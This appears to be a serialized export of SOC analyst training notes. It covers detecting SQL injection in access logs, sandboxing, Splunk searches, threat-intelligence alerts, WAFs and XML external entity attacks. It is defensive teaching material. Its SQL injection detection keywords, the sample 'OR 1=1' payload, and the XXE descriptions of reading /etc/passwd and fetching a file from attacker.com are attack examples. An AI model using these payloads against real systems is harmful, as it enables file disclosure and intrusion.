sanitize data received from a user: Never trust data received from a user. In addition, sanitize all data (such as headers, URLs, etc.), not just form data.\nAvoid the use of raw SQL queries: You may be in the habit of writing raw SQL queries, but you should take advantage of the security provided by the framework.\n\nDetecting SQL Injection Attacks\nSo how do we detect SQL injection attacks?\nThere is more than one answer to this question:\n\nWhen examining a web request, check all areas that come from the user: As SQL injection attacks are not limited to the form areas, you should also check the HTTP request headers such as the “User-Agent”.\nLook for SQL keywords: Look for words such as “INSERT”, “SELECT”, and “WHERE” in the data received from users.\nCheck any special characters: Look for apostrophes (’), dashes (-), or parentheses used in SQL or special characters commonly used in SQL attacks in the data received from the user.\nFamiliarize yourself with commonly used SQL injection payloads: Although SQL payloads change depending on the web application, attackers still use some common payloads to test for SQL injection vulnerabilities. If you are familiar with these payloads, you can easily detect SQL injection payloads. You can find some commonly used SQL injection payloads here.\n\nDetecting Automated SQL Injection Tools\nAttackers use many automated tools to detect SQL injection vulnerabilities. One of the well-known tools is Sqlmap. However, let’s look at the bigger picture rather than focusing on one particular tool.\nYou can use the following methods to detect SQL injection tools:\n\n\nLook at the User-Agent: Automated tools usually have their names and versions recorded. You can look at the User-Agent to detect these automated tools.\n\n\nCheck the frequency of requests: Automated tools are designed to send an estimated number of requests per second to test payloads as quickly as possible. A normal user might send 1 request per second, so looking at the number of requests per second will tell you if the requests are from an automated tool or not.\n\n\nLook at the content of the payload: Automated tools usually include their own names in their payloads. For example, an SQL injection payload sent by an automated tool might look like this: sqlmap’ OR 1=1\n\n\nIf the payload is complicated: This detection method may not always work, but based on my experience I could say that automated tools send more complicated payloads.\n\n\nA Detection Example\nWe have access logs of a web application that was the victim of a SQL injection attack.\nYou may not know what an access log is. In a nutshell, they are the access logs from the web server. These logs usually contain the source IP address, date, requested URL, HTTP method, user agent, and HTTP response code, and they are very useful for investigations.\n\n(SQL Injection Access Logs)\nWe have an access log in hand. What do we do now?\nFirst of all, if we look at the pages that were requested, we see that besides pages like “info.php”, which is quite readable, there are also requests for pages that are complex and contain symbols like %. We cannot say that requests for pages like this are malicious, but the fact that they are repeated many times is suspicious.\nNext, let’s talk about what the % symbols mean. When we request a page that contains special characters, these requests are not sent directly to the web server. Instead, our browsers perform a URL encoding (“Percent Encoding”) of the special characters and replace each special character with a string that starts with % and contains 2 hexadecimal characters. So the pages that contain the % symbol above are pages that contain special characters.\n\nNow that we understand what the % symbols mean, let’s revisit the access logs. If we look at the requests, we can easily see that there are readable words such as “UNION”, “SELECT”, “AND”, and “CHR” next to the % symbols. As these are specific words belonging to SQL, we can see that we are facing an SQL injection attack.\nTo protect our eyes, let’s make the investigation a bit easier :) You can search with the keywords ” Online URL Decoder” to find web applications that automatically decode URLs for you. To make it easier to read these access logs, we’ll get help from these web applications, so we don’t have to strain our eyes.\nPlease note this: It is not wise to upload something like access logs, which contain critical information, to a 3rd party web application. The access logs uploaded in this course have been prepared specifically for educational purposes; don’t make such a mistake in your professional life.\n\nWhen we decode the URL, we can see more clearly that this is a SQL injection attack. So what do we do now?\nWe are going to find any other information we can from these access logs.\n\nFirst, let’s look at the request times. All the SQL injection payloads were sent on “19/Feb/2022 11:09:24”. We can see that more than 50 requests were made in 1 second. The fact that so many requests were made in such a short period indicates that this is an automated attack. In addition, as we mentioned earlier when attackers do manual testing, they choose to test simple payloads first. But when we look at the access logs, we see that the payloads are very complicated. This shows that the attack could be automated.\nWas is successful?\nWe have confirmed that an SQL injection attack was performed and that it was performed with an automated tool. So we can finish our analysis, right?\nThere is one more step to take. We need to determine whether or not the attack was successful. You can determine whether a SQL injection attack has been successful by looking at the response, but in real life, you will almost never have access to the response. We can assume that all responses will be about the same size because the attack is on the same page and via the “id” variable, and estimate the success of the attack by looking at the size of the response.\nUnfortunately, the simple web server developed as an example cannot provide a reliable response size. Therefore, we cannot estimate whether the attack was successful by looking at this example. However, for correctly configured web servers, we can find the response size in the access logs. You can examine this area to see if there is a noticeable difference in response sizes. If there is a noticeable difference, then you can assume that the attack was successful. However, in this situation, it would be best to escalate this alert to a senior analyst."},"SOC/Sandbox-Solutions":{"slug":"SOC/Sandbox-Solutions","filePath":"SOC/Sandbox Solutions.md","title":"Sandbox Solutions","links":[],"tags":[],"content":"What is Sandbox Solutions?\nSandbox is a technology used to run/open and examine executable files or file types with different extensions (pdf, docx, and xlsx, etc.) that are thought or known to be malware in an isolated environment. Thanks to the Sandbox, precautions are taken against the problems that may arise when the file is run/opened on a live system.\nThe Benefits of Sandboxing\n\nIt does not put hosts and operating systems at risk.\nDetects potentially dangerous files.\nAllows testing of software updates before they go live.\nIt allows fighting against 0-day vulnerabilities.\n\nThe Importance of Sandboxes for Security\nMalware types encountered in the past are now trying to access systems with more different and advanced methods by designing themselves in a better way. Therefore, technologies that provide security against advanced attack tools and malware are also created. Sandboxes should be used to see malware behaviors and take precautions accordingly. Here’s how a sandbox works:\n\nSome popular Sandbox products used in the cyber security industry are as follows:\n\nCheckpoint\nMcAfee\nSymantec\nTrend Micro\nProofpoint\n\nWhat data sources do sandboxes have?\nEach sandbox product holds its unique data. However, it can be said that the information that sandboxes can keep in the data presented to the user due to their duty is about the analysis they make. For example, when the sample.exe file is run in the sandbox environment, information such as the run time of this file, the files the program accesses after running, its behavior, the date/time information of these operations, and the hash information of this file may be included in the data provided to the user by the sandbox product."},"SOC/Searching-Data-in-Splunk":{"slug":"SOC/Searching-Data-in-Splunk","filePath":"SOC/Searching Data in Splunk.md","title":"Searching Data in Splunk","links":[],"tags":[],"content":"Search on Splunk\nLet’s take a tour on the Search page. As you see, there is a lot of information to learn, let’s try to clarify them.\n\nTraps and Tips\n\n\nField names are case sensitive\n\n\nField values are not case sensitive\n\n\nThe wildcard is available (use *)\n\n\nYou can use operators such as AND, OR, NOT\n\n\nDate Selection\nThe first thing to do is to select the data range.\n\nFrom here you can choose:\n\n\nPresets (today, last week, last year, last 24 hours, etc.)\n\n\n\n\n\nRelative (beginning of the hour, X minutes ago, X weeks ago, etc.)\n\n\n\n\n\nReal-time\n\n\nDate range (between 00:00 DD/MM/YYYY and 24:00 DD/MM/YYYY)\n\n\n\n\n\nDate &amp; time range (same but you can choose an hour)\n\n\nTimeline\nWhen you perform a search, Splunk displays a Timeline\n\nSearch Mode\nThere are three modes, you will use mostly the Smart Mode.\n\n\nSearch Bar\n\nThis is where you make your request. As we said previously, you can use the wildcard character (”*”) and operators. You can mix it all!\n\n\nSearch for a username with “Je” on it. Try “Username=Je*” You will find username like Jeanne, Jean, etc.\n\n\nSearch for connection on the computer named computer1. Try “eventid=4624 AND computername=computer1”\n\n\nSearch for every connection on the computer except the domain controller. Try “eventid=4624 NOT computername=domaincontroller”\n\n\nRemember to use “Search History”\n\n\nFields\nFields are available on the left. Here you have each field available in your search.\n\nSelect the field to have information about it.\n\nSave As\nIn this menu, you can choose to save your request as a report, alert, or dashboard."},"SOC/Security-Solutions":{"slug":"SOC/Security-Solutions","filePath":"SOC/Security Solutions.md","title":"Security Solutions","links":["SOC/Intrusion-Detection-System-(IDS)","SOC/Intrusion-Prevention-System-(IPS)","SOC/Firewall","SOC/Endpoint-Detection--and--Response-(EDR)","SOC/Antivirus-Software","SOC/Sandbox-Solutions","SOC/Data-Loss-Prevention","SOC/Asset-Management-Solutions","SOC/Web-Application-Firewall","SOC/Load-Balancer","SOC/Proxy-Server","SOC/Email-Security-Solutions","SOC/Splunk"],"tags":[],"content":"Index\n1. Intrusion Detection System (IDS)\n2. Intrusion Prevention System (IPS)\n3. Firewall\n4. Endpoint Detection &amp; Response (EDR)\n5. Antivirus Software\n6. Sandbox Solutions\n7. Data Loss Prevention\n8. Asset Management Solutions\n9. Web Application Firewall\n10. Load Balancer\n11. Proxy Server\n12. Email Security Solutions\nNext: Splunk"},"SOC/Splunk":{"slug":"SOC/Splunk","filePath":"SOC/Splunk.md","title":"Splunk","links":["SOC/Adding-Data-to-Splunk","SOC/Searching-Data-in-Splunk","SOC/Cyber-Threat-Intelligence"],"tags":[],"content":"Index\n1. Adding Data to Splunk\n2. Searching Data in Splunk\nNext: Cyber Threat Intelligence"},"SOC/Static-Email-Analysis":{"slug":"SOC/Static-Email-Analysis","filePath":"SOC/Static Email Analysis.md","title":"Static Email Analysis","links":["phishing","IP-address"],"tags":[],"content":"Many people find plain text boring, which is why email programs offer HTML support, allowing us to create emails that are more likely to grab the user’s attention. Of course, there is a downside to this feature. Attackers can use HTML to create emails that hide malicious URLs behind buttons or text that appear to be harmless.\n\nAs seen in the image above, the address the user sees when clicking on a link can be different (the real address is seen when the user hovers over the link).\nIn most phishing attacks, the attackers take a new domain address and complete a phishing attack within a few days. Therefore, if the domain name in the email is new, it is more likely to be a phishing attack.\nBy querying VirusTotal for web addresses in emails, we can find out if the antivirus engines detect the web address as harmful.\nPerforming a static analysis of the files in the email can provide insight into the capacity/capability of the file. However, since static analysis takes a long time, dynamic analysis can provide the information you need more quickly.\nCisco Talos Intelligence has search sections where we can learn the reputation of IP addresses. By looking up the SMTP address of the email we detected in Talos, we can see the reputation of the IP address and find out if it is on the blacklist. If the SMTP address is blacklisted, it can be assumed that the attack was carried out on a compromised server.\n\nSimilarly, the SMTP address can be searched on VirusTotal and AbuseIPDB to find out if the IP address has been involved in malicious activity in the past."},"SOC/Timestomping":{"slug":"SOC/Timestomping","filePath":"SOC/Timestomping.md","title":"Timestomping","links":["SOC/Masquerading"],"tags":[],"content":"Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder and blend malicious files with legitimate files and to revert modification date of file.\nTimestomping may be used along with file name Masquerading to hide malware and tools."},"SOC/Unified-Kill-Chain":{"slug":"SOC/Unified-Kill-Chain","filePath":"SOC/Unified Kill Chain.md","title":"Unified Kill Chain","links":["SOC/Cyber-Kill-Chain","SOC/Reconnaissance","SOC/Gaining-Initial-Foothold","SOC/Network-Propagation","SOC/Adversary's-Objectives","SOC/MITRE-ATT-and-CK-Framework"],"tags":[],"content":"The unified kill chain aims to complement (not compete with) other cybersecurity kill chain frameworks, such as The Cyber Kill Chain. It states that there are 18 phases to an attack: Everything from Reconnaissance to data exfiltration and understanding an attacker’s motive.\n\nThe unified kill chain can be divided into 3 categories:\nPhase: IN\nThis is the phase where adversary gains initial foothold in the system. It is described in detail in Gaining Initial Foothold page.\nPhase: THROUGH\nThis is the phase where the adversary moves through the network and gains access to the whole network. It is explained in detail in Network Propagation page.\nPhase: OUT\nThis is the stage where the adversary will execute their objective and end the process. This phase is explained in detail in Adversary’s Objectives page.\nNext: MITRE ATT&amp;CK Framework"},"SOC/Using-Threat-Intelligence":{"slug":"SOC/Using-Threat-Intelligence","filePath":"SOC/Using Threat Intelligence.md","title":"Using Threat Intelligence","links":[],"tags":[],"content":"After the data is interpreted in relation to the attack surface, it will become consumable threat intelligence. The intelligence obtained can be used in the following 3 different areas.\n\n\nExternal Attack Surface Management (EASM)\n\n\nDigital Risk Protection (DRP)\n\n\nCyber ​​Threat Intelligence (CTI)\n\n\nWhen these 3 areas are combined, they form the XTI structure we mentioned at the beginning of our training. Each structure consumes intelligence by using it on different topics.\nExternal Attack Surface Management (EASM)\nEASM is part of XTI, which manages organizations’ outward assets. We explained how to create the attack surface, which is the basis of External Attack Surface Management, in the previous sections. In this section, we will cover how we manage the attack surface we have created and how it is fed from the collected intelligence.\nAttack surface is essential for organizations to detect their unknown or forgotten assets and provide visibility and the EASM will come into play right at this point since any security vulnerability on these assets will pose a risk for the organization. Detected assets must be monitored constantly. For example, adding a newly purchased domain to the asset list immediately or deleting a discontinued domain from the asset list is a part of this monitoring effort. We can keep track of these assets through External Attack Surface Management. EASM will notify the user if a domain expires, the title of the website changes or a subdomain is created. One of the main factors that will provide intelligence in this section is the use of information obtained from the assets themselves. A second factor is using the intelligence produced as a result of the vulnerability data obtained from outside sources like Shodan, etc. In this part, we receive notifications about security vulnerabilities on our assets as a result of the intelligence we used.\nIn the section below, the alarms that may occur as a result of the active use of threat intelligence by EASM and the actions we can take are mentioned:\nNew Digital Asset(s) Detected\nThis is the warning we will encounter when a new asset is detected and added to our continuously monitored asset list. We need to check whether the asset really belongs to our organization and was created by the authorized users of our organization.\nDomain Information Change Detected\nIt is the warning that alerts us when there is any change in the whois information of the domain in our asset list. We should check this activity to see if it is a harmful activity or not by comparing the old and the new data, and verifying if the change is made by the authorized users of our organization.\nDNS Information Change Detected\nThis is the warning that alerts us when there is any change in the DNS records of the domain in our asset list. We should check this activity to see if it is a harmful activity or not by comparing the old and the new data, and verifying if the change is made by the authorized users of our organization.\nDNS Zone Transfer Detected\nThis is the warning that alerts us when there is a change DNS Zone Transfer status of the domain in our asset list. We should check the DNS records for the relevant assets and verify if there is a zone transfer.\nInternal IP Adress Detected\nSince the IP addresses we specify in the A records of our domains are open to the public and can be seen outside of our network, they must not be internal IP addresses. If an internal IP is disclosed in the A record of a domain or subdomain, we will receive an alert that warns us of the “Internal IP Address Detected” on our EASM side. This may happen due to the lack of communication between different teams in our organization. In such cases, the process should be verified by contacting the POC of the DNS record maintenance and the root cause should be investigated. The IP should be changed if its use is not necessary.\nCritical Open Port Detected\nThis is the warning that alerts us when there is an indication for open critical ports on the IPs that we are monitoring within the intelligence we received from sources such as “Shodan”. We should check the ports claimed to be open on the relevant IP addresses that we receive the alert, and we should close or filter them if they are not the ports used by our network actively. If the open ports are used actively, then we should update the services running on them and keep them up to date, and make sure that necessary configurations are complete.\nSMTP Open Relay Detected\nThis is the warning that alerts us when there is an open relay status for our mail server which we monitor within our asset list. We should investigate the mail server in question and verify the status of the mail server by contacting the POC of the server.\nSPF/DMARC Record Not Found\nSPF and DMARC records are constantly checked for domains that we track in our asset list, and we receive this alert when these records are not found. These records must be configured correctly for the security of our mail servers. We need to contact the POC of our mail server and verify its status.\nSSL Certificate Revoked/Expired\nSSL certificates are one of the most important elements for secure communication. Our SSL certificates hosted on our domains should be monitored regularly within our asset list. We will receive this alert if one of our SSL certificates is expired or revoked. Any communication carried out without SSL poses high risks as the data is transmitted in clear text and can be seen by third parties. Therefore, we need to renew our SSL certificate as soon as possible when we receive this alert.\nSuspicious Website Redirection\nSometimes we redirect some of our domains to some of our websites. If we do this frequently, we are likely to miss suspicious redirects. Therefore, we need to receive feeds that provide us with the status codes of our websites and where they are directed. If we receive this alert, it means that one of our domains in our asset list is redirecting to a website that is not in our asset list. This indicates a potential breach. We must urgently check the redirection and report the case to the relevant team that manages these issues.\nSubdomain Takeover Detected\nWe receive this alert if a takeover is detected on a subdomain. This case should be investigated to find the DNS record that this takeover took place and the details should be shared with the team that will handle the case.\nWebsite Status Code Changed\nWe receive this alert when the status code that our website returns back to us is changed. This warning comes to us from the data containing the status codes of the websites. In order to prevent service interruptions, the status code and the problem should be determined with its root cause, and the solutions to remediate the issue should be applied immediately.\nVulnerability Detected\nThis alert comes to us as a result of intelligence obtained from vulnerability data. If we encounter this warning, it means that there is a match between the vulnerabilities in the data and our network applications, SSL certificates, domains, websites, IPs, or 3rd party technologies. If the warning is generated from the CVE data and there is product and version information in which the vulnerability is triggered in the details of the CVE, the accuracy of the alert is very high, immediate action must be taken and the suggested fixes should be applied immediately. The accuracy rate may be slightly lower if the warning is coming from other sources like shodan, etc.\nDigital Risk Protection\nDRP is the part of XTI that constitutes most of the intelligence for the organization after all the data collected from all the sources are mapped with the attack surface following the interpretation of the data. In this section, we will cover topics such as the protection of brand reputation, threats on the Deep&amp;Dark Web, fraud protection specific to banks, the impact of risks that may occur in any organization in the supply chain, threats to the organization on the web surface and protection for senior executives, and the threats and risks we may face related to these as well as how we should take action against them will be detailed. Below are the alarms that we may encounter within the scope of DRP and the actions we can take:\nPotential Phishing Domain Detected\nNewly registered domains or previously registered domains with newly created SSL certificates are an intelligence source for us. After interpreting the data obtained from these sources, we encounter this warning for domains with a structure similar to our domains in the intelligence obtained. When we receive this alert, we should investigate the relevant domain in safe environments and determine whether they are mimicking our original content. If these domains mimic our brand and/or content, we should contact the domain registrar and the ISP that hosts the content of the fraudulent site to take it down immediately. If there is nothing suspicious in the content, the domain should still be monitored there is a high potential for that domain to turn into a phishing site.\nRogue Mobile Application Detected\nIf our organization has mobile applications, we will receive this alert if there is a match with our official mobile application and the data that contains the pirated APK files found on pirated APK sites with similar names and similar content. The APK files transmitted in this alert should be analyzed in a safe environment, and quick remediation action should be taken if they are found malicious. These copycat mobile applications should be taken down immediately to avoid any malicious activities and to protect our brand reputation.\nIP Address Reputation\nThere are multiple reasons that cause the loss of reputation of IP addresses. If we receive this alert it means that there is an incident that occurred affecting our IP reputation. Possible reasons for the loss of the IP reputation are as follows:\n\n\nIf the IP address is blacklisted on any source for any reason,\n\n\nIf the IP address is found in a feed containing harmful IOCs,\n\n\nIf the IP address has been involved in an activity in the torrent network,\n\n\nthen the reputation of the IP address will be lost.\nWe will receive this alert if any of our IP addresses are among the resources that will cause this reputation loss. If it is a blacklist case, we should investigate the root cause and determine on what sources it has been blacklisted. The root cause of the blacklist should be investigated and eliminated. It will be more risky and harmful if our IP addresses have been found in a feed containing harmful IOCs or involved in the torrent network because our IP addresses could potentially be used in a malicious campaign. This raises the possibility that the organization has been breached. In this case, we must quickly investigate the relevant systems retrospectively and identify the root cause. If the breach has happened, we need to enforce the internal policies.\nImpersonating Social Media Account Detected\nSocial media is a platform that many organizations use to represent themselves. Thousands of new accounts are created every day on these platforms. Not all accounts are created with good intentions. Many accounts may be created with user names that can imitate the original accounts of the organization or with the intention to conduct smear campaigns against the organization. We will receive this alert if we encounter such a situation. In this case, the relevant account should be reviewed and determined whether it is just a name similarity or an attempt to mimic. If the account is being used for fraud or a smear campaign against our organization, we should contact the support team of the relevant social media application and request that this account be closed.\nBotnet Detected at Black Market\nWe receive this alert if any of our organization’s domain or IP addresses is included in the botnet data in the black markets. The user system that became a bot reported in the alert may belong to one of our employees or customers. If the system belongs to a customer, the user’s password should be reset to remediate the incident. If the system belongs to one of our employees forensics investigation should be conducted, the system should be isolated from the network immediately, employee’s network credentials must be reset. Further investigations must be conducted on the system to determine if the system is infected or not.\nSuspicious Content Detected at Deep&amp;Dark Web\nDeep&amp;Dark web environments are monitored and all data is collected regularly. We receive this alert if there is anything that mentions our organization in the data after the collected data is interpreted. For example, if there is a post on a hacker forum mentioning an attack against our organization, then we can implement security tightening even before the attack occurs. We can avoid the attack totally or get it over with the least damage thanks to these posts. When we encounter this alert, the post that threatens our organization and its content should be analyzed thoroughly, and necessary actions should be taken accordingly.\nSuspicious Content Detected at IM Platforms\nInstant messaging platforms such as Telegram, ICQ, and IRC are the environments that threat actors use for communication. We receive this alert if there is anything that mentions our organization in the data after the conversations of the threat actors in the public or private groups of these platforms are monitored and the collected data is interpreted. In this case, the conversation or the statement about our organization should be analyzed thoroughly and the context of the mention regarding our organization should be determined. If there is a threat to the organization, necessary actions should be taken quickly.\nStolen Credit Card Detected\nIt is a common situation for fraud teams of banks. Threat actors steal credit card information by phishing or other ways and share or sell them in the dark web environment. In these types of cases, banks should follow these stolen credit cards well in order to protect their customers. We receive this alert if a stolen credit card number matches with one of the bank’s with the help of the intelligence gathered. In this case, we must inform the fraud teams immediately and take action to cancel the card.\nData Leak Detected on Code Repository\nWe mentioned that code repositories such as Github, Bitbucket, Azure Blob, and Amazon S3 where we can store data or store codes are one of the sources of intelligence. Sometimes sensitive data for the organization may be forgotten in such environments. We will receive this alert if sensitive and critical data such as an IP address of the organization, domain, database access information, login information that belongs to employees, or if a sensitive report related to the organization is detected in a bucket through the intelligence gathered. In this case, we must take quick action to delete the sensitive data if we manage the relevant repository or bucket. If someone outside of our organization manages it, then, we should go after the takedown option.\nCompany Related Information Detected on Malware Analysis Services\nPublic sandboxes are one of the important intelligence sources for the organization to detect malicious files against our organization. Thousands of samples are uploaded and analyzed in these sandboxes every day. A malicious file referring to our organization is crucial for our organization. It may target our organization directly or may have been uploaded by an attacker with the intention of smearing our organization. In these cases, we receive these alerts as a warning for these malicious files that refer to our organization within the collected data and we should investigate and analyze the malicious file and take the necessary actions.\nEmployee and VIP Credential Detected\nThese are the warnings that will occur if there is a data leak related to our employees, especially the VIPs that we keep monitoring actively. When we see these alerts we need to apply the password reset process for the relevant users quickly.\nCyber Threat Intelligence\nCTI is considered a part of XTI, which is the next-generation threat intelligence. It is a sub-branch of XTI and it is where we can be aware of what is happening in the cyber world in general, where we can learn about current malicious campaigns, the orientation of ransomware groups, or offensive IP addresses around the world. Since it may be difficult to protect our organization with CTI alone, we should support the CTI with our corporate feeds to obtain the most efficient intelligence. We are able to use our SIEM, SOAR, and EDR tools more effectively by integrating them into the CTI feeds and protect our organization better."},"SOC/Watering-Hole":{"slug":"SOC/Watering-Hole","filePath":"SOC/Watering Hole.md","title":"Watering Hole","links":[],"tags":[],"content":"A watering hole attack is a targeted attack designed to aim at a specific group of people by compromising the website they are usually visiting and then redirecting them to the malicious website of an attacker’s choice.\nThe attacker would look for a known vulnerability for the website and try to exploit it. The attacker would encourage the victims to visit the website by sending “harmless” emails pointing out the malicious URL to make the attack work more efficiently. After visiting the website, the victim would unintentionally download malware or a malicious application to their computer. This type of attack is called a drive-by download. An example can be a malicious pop-up asking to download a fake Browser extension."},"SOC/Web-Application-Firewall":{"slug":"SOC/Web-Application-Firewall","filePath":"SOC/Web Application Firewall.md","title":"Web Application Firewall","links":[],"tags":[],"content":"What is a Web Application Firewall (WAF)?\nWeb Application Firewall (WAF) is security software or hardware that monitors, filters, and blocks incoming packets to a web application and outgoing packets from a web application.\nTypes of WAF\nThere are several types of WAF products:\n\nNetwork-based WAF\nNetwork-based WAF is a security product that is hardware-based on the relevant network. It needs staff to write rules on it and to maintain it. Although it is an effective WAF product, it is more expensive than other WAF products.\nHost-based WAF\nHost-based WAF is a cheaper product than network-based WAF. It is a WAF with more customization possibilities. Considering that it is a software product, it consumes the resources of the server it is on. It may be more difficult to maintain and the systems on it must be securely hardened.\nCloud-based WAF\nCloud-based WAF is a much more convenient and easy-to-apply security solution than other WAF products purchased as an external service. Since the maintenance and updates of the WAF product belong to the service area, there are no additional costs such as cost and maintenance. However, it is a matter to be considered that the cloud-based WAF product that is serviced has sufficient customizations suitable for you.\nHow does a web application firewall (WAF) work?\nA WAF manages inbound application traffic according to existing rules on it. These requests, which belong to the HTTP protocol, are either allowed or blocked per the rules. Since it works at the application layer level, it can prevent web-based attacks. In the image below, the working logic of the WAF product is shown in a basic sense:\n\nBefore going to the web application, HTTP requests from users are met in the WAF product. According to the rule set on the WAF product, as shown in the image below, some requests are not allowed to pass, and thus requests that create malicious traffic are blocked. Here, it is very important how the rules on the WAF define the attack, otherwise, it is possible to block incoming normal requests even though they do not show malicious behavior. This shows that the WAF product is not used efficiently and correctly, so it may result in not being able to prevent the attack at some points.\n\nThe image above, it is shown how an action is taken on the WAF product against normal and malicious requests.\nThe Importance of WAF for Security\nToday, applications in almost every sector are available in local networks or open to the Internet. Ensuring the security of web applications, which are widely used in the IT world, is of critical matter. Serious data leaks or security breaches can occur on unsecured web applications. To prevent all these security breaches, WAF products are placed in front of web applications. Even the presence of the WAF product in front of the web applications is not sufficient to ensure application security, while the absence of the WAF product is not recommended at all.\nSome popular WAF products used in the cybersecurity industry are as follows:\n\nAWS\nCloudflare\nF5\nCitrix\nFortiweb\n"},"SOC/Web-Attacks":{"slug":"SOC/Web-Attacks","filePath":"SOC/Web Attacks.md","title":"Web Attacks","links":["SOC/OWASP","SOC/How-Web-Applications-Work","SOC/SQL-Injection","SOC/XSS-Attack","SOC/Command-Injection","SOC/IDOR-Attack","SOC/Open-Redirection-Attack","SOC/Directory-Traversal-Attack","SOC/Brute-Force-Attack","SOC/XEE-Attack","Malware-Analysis/Malware-Analysis"],"tags":[],"content":"What are Web attacks?\nBecause web applications serve as the interface to the internet for many organizations, they can be exploited by attackers to gain access to devices, steal personal data, or cause service disruptions, resulting in significant financial damage.\nA study found that 75% of all cyber-attacks are targeted at the web application level.\nIntroduction\n1. OWASP\n2. How Web Applications Work\nAttack Vectors\n1. SQL Injection\n2. XSS Attack\n3. Command Injection\n4. IDOR Attack\n5. Open Redirection Attack\n6. Directory Traversal Attack\n7. Brute Force Attack\n8. XEE Attack\nNext: Malware Analysis"},"SOC/What-is-SOC":{"slug":"SOC/What-is-SOC","filePath":"SOC/What is SOC.md","title":"What is SOC","links":["SOC/Pyramid-of-Pain"],"tags":[],"content":"What is SOC?\nSecurity Operations Center (SOC) is a team of IT security professionals tasked with monitoring, preventing , detecting , investigating, and responding to threats within a company’s network and systems.\nResponsibilities of SOC\n\nNext: Pyramid of Pain"},"SOC/Wireshark":{"slug":"SOC/Wireshark","filePath":"SOC/Wireshark.md","title":"Wireshark","links":[],"tags":[],"content":"Tool used to analyze network traffic. The GOAT"},"SOC/XEE-Attack":{"slug":"SOC/XEE-Attack","filePath":"SOC/XEE Attack.md","title":"XEE Attack","links":[],"tags":[],"content":"What is XML External Entity?\nFor a better understanding let’s quickly look at what XML is.\nXML (Extensible Markup Language) is a markup language that is used for structuring and storing data in a structured format that is both human-readable and machine-readable. XML was developed as a successor to HTML (Hypertext Markup Language) and is widely used for data exchange between different systems and platforms, particularly on the web.\nXML uses a set of tags to define the structure and content of the data being represented. These tags are used to identify and describe various elements and attributes of the data, such as tags for opening and closing elements, attributes for specifying additional information about the element, and entities for representing special characters and symbols.\nOne of the key advantages of XML is its flexibility and extensibility. It is possible to define custom tags and schemas for representing data, making it a powerful tool for representing complex data structures and exchanging data between different systems.\nWhile XML was once widely used for a variety of purposes, its usage has declined in recent years as newer data formats like JSON have gained popularity with its simplicity, ease of use, and better support for modern web technologies.\nXXE (XML External Entity) vulnerability is a type of security vulnerability that affects applications that parse XML input. In an XXE attack, an attacker injects malicious XML data into an application that uses an XML parser without proper validation, which can result in the application processing external entities that can be controlled by the attacker.\nAn external entity is a piece of XML that is defined outside of the XML document, but can be referenced and included within the document. An attacker can exploit an XXE vulnerability to include malicious external entities that can read local files, access internal systems, or perform other malicious actions on the server.\nXXE vulnerabilities can be exploited in various ways, such as through web forms that accept XML input, SOAP and REST APIs that use XML-based payloads, or other applications that accept and process XML input. These attacks can lead to sensitive data leaks, server-side request forgery (SSRF), denial of service (DoS) attacks, and other serious security issues.\nIt is important for developers to be aware of XXE vulnerabilities and take steps to prevent them, such as disabling external entities, validating and sanitizing XML input, and using secure XML parsers that are specifically designed to prevent XXE attacks.\nXML External Entity Possible Vectors\nTo find XML External Entity (XXE) vulnerabilities in a web application, you can start by examining the application’s XML processing code to identify any input points that accept XML input. These input points could include:\n\nForm fields that accept XML input\nXML files uploaded by users\nAPIs that accept XML requests\nXML files used for configuration or other purposes\n\nOnce you have identified the input points that accept XML input, you can test them for XXE vulnerabilities by providing input that includes external entity references and observing the application’s response.\nYou can also use automated vulnerability scanners and penetration testing tools that can detect and exploit XXE vulnerabilities. These tools can send various payloads that include external entity references and observe the response to determine if the application is vulnerable.\nHow XML External Entity Works?\nXXE attacks can depend on the programming language used by the server-side application. The XXE attack vector exploits a vulnerability in the XML parser of the server-side application, and the specific vulnerabilities and defenses can vary depending on the programming language used.\nFor example, PHP has a built-in XML parser called DOMDocument that is often used in web applications. The parser can be vulnerable to XXE attacks if the XML input is not properly validated and sanitized, and external entities are not disabled. As a defense, developers can use the libxml_disable_entity_loader() function to disable the loading of external entities in PHP.\nHere’s an example of vulnerable PHP code that demonstrates an XXE vulnerability:\n\nIn this example, the PHP script accepts an XML input parameter named “xml” and uses the loadXML() method of the DOMDocument class to parse it into a DOMDocument object. However, the code does not properly validate or sanitize the XML input, which can allow an attacker to inject an external entity and perform a variety of malicious actions.\nAn attacker could send the following XML input to exploit the XXE vulnerability:\n\nIn this XML input, the attacker defines a new external entity called “xxe” that references the “/etc/passwd” file on the server. When the PHP script processes this input, it will load the “/etc/passwd” file and include its contents in the output, which can allow the attacker to read sensitive information from the server.\nTo prevent XXE attacks in PHP, it is important to validate and sanitize any XML input properly and disable the processing of external entities whenever possible. You can use the libxml_disable_entity_loader() function to disable the loading of external entities in PHP. Additionally, you can use input validation and sanitization functions such as filter_var() to ensure that the XML input is properly formatted and does not contain any malicious payloads.\nLet’s take a look at how XXE vulnerability appears in Java servlet applications;\n\nIn this example, the servlet accepts an XML input parameter named “xml” and uses a DocumentBuilder object to parse it into a Document object. However, the code does not properly validate or sanitize the XML input, which can allow an attacker to inject an external entity and perform a variety of malicious actions.\nAn attacker could send the following XML input to exploit the XXE vulnerability:\n\nIn this payload, we define an external entity xxe that points to a remote XML file attacker.com/xxe.xml. Then, we include the entity within the  element using the &amp;xxe; syntax.\nWhen the XML parser processes this payload, it will attempt to fetch the remote xxe.xml file specified in the xxe entity. If the server hosting the vulnerable application is vulnerable to SSRF, this can result in the attacker being able to access internal systems or perform other malicious actions on the server.\nImpact of XML External Entity\nThe impact of an XXE vulnerability can vary depending on the specific vulnerability and the context of the application. In general, however, an XXE vulnerability can be quite serious and can result in a range of harmful outcomes, including:\n\nInformation disclosure: An attacker can use an XXE vulnerability to access sensitive data from the server with read/write capability that will allow the attacker to modify/transfer the data, such as configuration files, user credentials, and other sensitive information.\nServer-side request forgery (SSRF): An attacker can use an XXE vulnerability to make requests on behalf of the server, allowing them to scan internal networks, exploit other vulnerabilities, and carry out further attacks.\nDenial of service (DoS): An attacker can use an XXE vulnerability to launch a DoS attack by sending an XML input that causes the server to consume excessive resources, such as memory or CPU time.\nRemote code execution (RCE): In some cases, an attacker can use an XXE vulnerability to execute arbitrary code on the server, allowing them to take full control of the server and carry out further attacks.\n\nTherefore, it is important to identify and remediate XXE vulnerabilities in web applications to prevent these and other harmful outcomes. Best practices for preventing XXE attacks include properly validating and sanitizing all XML input, disabling the processing of external entities, and using the latest secure versions of XML parsers and frameworks.\nPrevention Methods for XML External Entity\nThere are several best practices that can help prevent XXE attacks:\nDisable external entities: One 